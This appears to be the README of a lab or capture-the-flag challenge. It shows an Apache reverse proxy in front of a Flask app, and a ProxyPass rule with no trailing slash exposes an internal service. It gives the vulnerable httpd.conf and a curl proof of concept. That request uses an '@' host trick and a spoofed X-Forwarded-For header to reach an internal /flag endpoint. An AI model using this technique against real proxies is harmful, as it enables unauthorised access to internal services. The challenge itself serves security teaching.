### Apache + Flask

ProxyPass is no ending slash

Try to access http://127.0.0.1:3000/flag

### Usage

Build
```
docker-compose up
```

Go http://127.0.0.1:8087/

### Hint
httpd.conf
```
ProxyPreserveHost On
ProxyPass / http://127.0.0.1:8080
ProxyPassReverse / http://127.0.0.1:8080
```

### POC
``` bash
curl "http://127.0.0.1:8086/@127.0.0.1:3000/flag" -H 'X-Forwarded-For: 127.0.0.1'
```